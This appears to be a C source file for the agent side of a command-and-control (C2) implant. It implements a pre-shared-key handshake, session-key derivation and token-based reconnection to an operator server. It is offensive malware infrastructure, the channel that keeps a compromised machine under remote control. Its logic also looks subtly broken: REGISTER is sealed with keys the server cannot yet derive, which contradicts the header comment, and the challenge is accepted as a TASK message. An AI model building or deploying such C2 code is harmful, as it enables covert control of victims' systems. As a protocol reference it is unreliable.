#include "c2.h"
#include "proto.h"
#include "crypto.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>

/*
 * 握手协议（纯对称 PSK + HKDF，不依赖 ECDH）：
 *
 *   Agent                                 Server
 *     |---- REGISTER(agent_id||ts||np)------>|  用 PSK 加密
 *     |<--- CHALLENGE(rand) -----------------|
 *     |---- AUTH(HMAC(challenge)) ---------->|
 *     |<--- CONFIRM(OK) ---------------------|
 *
 * 会话密钥由 PSK + nonce_prefix 派生，双方独立算出。
 */

static uint8_t g_psk[32];

c2_err_t c2_agent_start(struct c2_session *s, const char *endpoint,
                        const uint8_t *identity_key, size_t key_len) {
    if (!s || !endpoint) return C2_ERR;
    if (key_len != 32) return C2_ERR_AUTH;
    memcpy(g_psk, identity_key, 32);

    if (!s->transport || !s->transport->connect)
        return C2_ERR_TRANSPORT;

    c2_err_t e = s->transport->connect(s->transport->ctx, endpoint);
    if (e != C2_OK) return C2_ERR_TRANSPORT;

    s->state = C2_STATE_HANDSHAKE;
    return c2_agent_handshake(s);
}

static void derive_session_keys(struct c2_session *s, const uint8_t *nonce_prefix) {
    uint8_t ikm[40];
    memcpy(ikm, g_psk, 32);
    memcpy(ikm + 32, nonce_prefix, 8);

    crypto_kdf_derive(s->key_send, 32, ikm, sizeof(ikm),
                      (const uint8_t *)"c2-send-key", 12);
    crypto_kdf_derive(s->key_recv, 32, ikm, sizeof(ikm),
                      (const uint8_t *)"c2-recv-key", 12);
    crypto_kdf_derive(s->token, 32, ikm, sizeof(ikm),
                      (const uint8_t *)"c2-token", 8);
    crypto_wipe(ikm, sizeof(ikm));
}

c2_err_t c2_agent_handshake(struct c2_session *s) {
    if (!s || s->state != C2_STATE_HANDSHAKE) return C2_ERR_PROTO;

    uint8_t nonce_prefix[8];
    crypto_rng(nonce_prefix, 8);
    derive_session_keys(s, nonce_prefix);

    /* REGISTER = agent_id(8) || timestamp(8) || nonce_prefix(8) */
    uint8_t reg[24];
    memcpy(reg, &s->id, 8);
    uint64_t ts = (uint64_t)time(NULL);
    memcpy(reg + 8, &ts, 8);
    memcpy(reg + 16, nonce_prefix, 8);

    c2_err_t e = c2_seal_and_send(s, C2_MSG_REGISTER, reg, 24,
                                  PROTO_ROLE_CLIENT);
    crypto_wipe(nonce_prefix, 8);
    if (e != C2_OK) return C2_ERR_HANDSHAKE;

    /* 接收 CHALLENGE */
    uint8_t challenge[64];
    size_t clen = sizeof(challenge);
    uint8_t mtype = 0;
    e = c2_recv_and_open_internal(s, &mtype, challenge, &clen, PROTO_ROLE_SERVER);
    if (e != C2_OK || mtype != C2_MSG_TASK) return C2_ERR_HANDSHAKE;

    /* AUTH = HMAC(challenge, key_send)，用 C2_MSG_AUTH 类型与 RESULT 区分 */
    uint8_t response[32];
    crypto_hmac(response, s->key_send, 32, challenge, clen);

    e = c2_seal_and_send(s, C2_MSG_AUTH, response, 32, PROTO_ROLE_CLIENT);
    if (e != C2_OK) return C2_ERR_HANDSHAKE;

    /* 接收 CONFIRM */
    uint8_t confirm[8];
    size_t conlen = sizeof(confirm);
    e = c2_recv_and_open_internal(s, &mtype, confirm, &conlen, PROTO_ROLE_SERVER);
    if (e != C2_OK || mtype != C2_MSG_CONFIRM) return C2_ERR_HANDSHAKE;

    s->nonce_send = 0;
    s->nonce_recv = 0;
    s->state = C2_STATE_ACTIVE;
    s->last_heartbeat = (uint64_t)time(NULL);
    return C2_OK;
}

c2_err_t c2_reconnect(struct c2_session *s, const char *endpoint) {
    if (!s || s->state == C2_STATE_CLOSED) return C2_ERR;

    s->state = C2_STATE_RECONNECT;

    if (s->transport && s->transport->connect) {
        c2_err_t e = s->transport->connect(s->transport->ctx, endpoint);
        if (e != C2_OK) return C2_ERR_TRANSPORT;
    }

    /* 用 token 快速恢复 */
    uint8_t recon[40];
    memcpy(recon, s->token, C2_SESSION_TOKEN_LEN);
    uint64_t ts = (uint64_t)time(NULL);
    memcpy(recon + C2_SESSION_TOKEN_LEN, &ts, 8);

    c2_err_t e = c2_seal_and_send(s, C2_MSG_HEARTBEAT, recon, 40,
                                  PROTO_ROLE_CLIENT);
    if (e != C2_OK) return C2_ERR_HANDSHAKE;

    uint8_t ack[8];
    size_t alen = sizeof(ack);
    uint8_t mtype = 0;
    e = c2_recv_and_open_internal(s, &mtype, ack, &alen, PROTO_ROLE_SERVER);
    if (e == C2_OK && mtype == C2_MSG_ACK) {
        s->state = C2_STATE_ACTIVE;
        s->last_heartbeat = (uint64_t)time(NULL);
        return C2_OK;
    }
    /* 退回完整握手 */
    s->state = C2_STATE_HANDSHAKE;
    return c2_agent_handshake(s);
}
